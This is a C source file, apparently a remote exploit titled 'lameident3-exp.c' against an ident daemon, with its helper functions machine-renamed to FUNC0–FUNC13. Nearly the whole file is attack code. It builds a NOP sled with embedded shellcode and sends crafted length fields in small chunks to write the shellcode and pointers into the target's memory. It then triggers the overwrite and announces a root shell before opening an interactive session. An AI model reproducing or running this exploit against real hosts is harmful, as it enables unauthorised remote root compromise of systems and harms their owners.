#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct in_addr {int s_addr; } ;
typedef  int /*<<< orphan*/  buf2 ;
typedef  int /*<<< orphan*/  buf1 ;
struct TYPE_2__ {long baseaddr; char* name; char* shellcode; } ;

/* Variables and functions */
 long ALIGN ; 
 int USLEEP ; 
 int FUNC0 (char*) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int /*<<< orphan*/  FUNC2 (int) ; 
 int /*<<< orphan*/  FUNC3 (char*) ; 
 int FUNC4 (struct in_addr) ; 
 int /*<<< orphan*/  FUNC5 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC6 (char*,int,int) ; 
 int /*<<< orphan*/  FUNC7 (char*,...) ; 
 int FUNC8 (char*) ; 
 int FUNC9 (int,char*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC10 (int) ; 
 int FUNC11 (char*) ; 
 TYPE_1__* target ; 
 int /*<<< orphan*/  FUNC12 (int) ; 

int FUNC13(int argc, char *argv[]) {
  int s, a, uwait = USLEEP, nops = 500;
  long baseaddr;
  long shelladdr = 0xbfffa090;
  long pointaddr = 0;
  char buf1[2020], buf2[32], *p, *shellcode;
  struct in_addr host;

  FUNC7("lameident3-exp.c by sloth @ b0red\n");

  if(argc<3) {
    FUNC7("usage: ./lameident3-exp <target> <host> <send delay in ms>\n");
    for(a=0;target[a].baseaddr;a++)
      FUNC7("  %d: %x %s", a, target[a].baseaddr, target[a].name);
    FUNC2(-1);
  }

  for(a=0;a<FUNC0(argv[1]);a++)
    if(!target[a].baseaddr)
      FUNC3("invalid target");

  baseaddr  = target[a].baseaddr;
  shellcode = target[a].shellcode;
  if(argv[3]) uwait = FUNC0(argv[3]);

  if((host.s_addr = FUNC8(argv[2])) == -1)
    FUNC3("invalid host");

  FUNC6(buf1, 0, sizeof(buf1));
  FUNC6(buf1, 0x90, sizeof(buf1)-FUNC11(shellcode)-1);
  FUNC5(&buf1[(sizeof(buf1)-FUNC11(shellcode)-1)],shellcode,FUNC11(shellcode));

  s = FUNC4(host);

  FUNC9(s, "AAAAAAAAAAAAAAAAAAA", 19, 0);
  FUNC12(uwait);

  FUNC6(buf2, 0, sizeof(buf2));
  buf2[0] = 'A';
  *(long *)&buf2[1] = shelladdr - baseaddr - 5;

  FUNC9(s, buf2, 5, 0);
  FUNC12(uwait);

  p = buf1;
  FUNC7("Writing shellcode: %d bytes to 0x%x...\n", FUNC11(buf1), shelladdr);

  for(a=0;a<=FUNC11(buf1), *p;) {

    if((a = FUNC9(s, p, FUNC11(p) > 19 ? 19 : FUNC11(p), 0)) == -1)
      FUNC3("write error");

    p += a;
    FUNC12(uwait);

  }

  FUNC1(s);
  FUNC12(100);


  s = FUNC4(host);

  FUNC9(s, "AAAAAAAAAAAAAAAAAAA", 19, 0);
  FUNC12(uwait);

  FUNC6(buf2, 0, sizeof(buf2));
  buf2[0] = 'A';
  *(long *)&buf2[1] = shelladdr - baseaddr + FUNC11(buf1) + 20 - 5;

  FUNC9(s, buf2, 5, 0);
  FUNC12(uwait);

  p = buf1;
  pointaddr = shelladdr + FUNC11(buf1) + 20;
  FUNC7("Writing pointers to 0x%x\n", pointaddr);

  FUNC6(buf1, 0, sizeof(buf1));
  for(a=0;a<=512;a += 4)
    *(long *)&buf1[a] = shelladdr + 500;

  for(a=0;a<=FUNC11(buf1), *p;) {

    if((a = FUNC9(s, p, FUNC11(p) > 19 ? 19 : FUNC11(p), 0)) == -1)
      FUNC3("write error");

    p += a;
    FUNC12(uwait);

  }

  FUNC1(s);
  FUNC12(uwait);


  s = FUNC4(host);

  FUNC9(s, "AAAAAAAAAAAAAAAAAAA", 19, 0);
  FUNC12(uwait);

  FUNC6(buf2, 0, sizeof(buf2));
  buf2[0] = 'A';
  *(long *)&buf2[1] = 0xffffffff - 0x9f - 5;

  FUNC9(s, buf2, 5, 0);
  FUNC12(uwait);

  FUNC6(buf2, 0, sizeof(buf2));
  *(long *)&buf2[0] = pointaddr + 200 + ALIGN;

  FUNC9(s, buf2, 4, 0);

  FUNC1(s);
  FUNC12(uwait);


  s = FUNC4(host);

  FUNC9(s, "1234, 1234\n", 11, 0);
  FUNC12(uwait);

  FUNC7("here comes the root shell!\n");
  FUNC10(s);

  FUNC1(s);
}